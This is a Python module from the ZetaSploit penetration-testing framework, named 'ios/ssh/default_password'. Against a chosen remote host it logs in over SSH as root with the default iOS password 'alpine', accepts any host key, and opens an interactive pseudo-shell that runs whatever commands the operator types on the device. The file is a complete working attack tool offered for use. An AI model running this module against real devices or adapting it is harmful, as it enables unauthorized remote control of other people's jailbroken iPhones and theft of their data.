#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import sys
import paramiko

from core.badges import badges
from core.helper import helper

class ZetaSploitModule:
    def __init__(self):
        self.badges = badges()
        self.helper = helper()

        self.thread = None
        self.controller = None
        self.sessions_id = dict()
        self.is_running = False

        self.details = {
            'Name': "ios/ssh/default_password",
            'Authors': ['enty8080'],
            'Description': "Bypass iOS OpenSSH using default password.",
            'Comment': "Default iOS password - alpine",
            'HasOptions': True,
            'HasCommands': False
        }

        self.options = {
            'RHOST': {
                'Description': "Remote host.",
                'Value': "",
                'Required': True
            },
            'USERNAME': {
                'Description': "SSH username.",
                'Value': "root",
                'Required': True
            }
        }

    def run(self):
        username = self.options['USERNAME']['Value']
        remote_host = self.options['RHOST']['Value']
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(remote_host, username=username, password='alpine')
        while True:
            try:
                command = input('pseudo_shell> ').strip()
                if command.split() != []:
                    if command.split()[0] == "exit":
                        break
                    else:
                        stdin, stdout, stderr = ssh.exec_command(command)
                        response = stdout.readlines()
                        print(response)
            except:
                pass
        ssh.close()
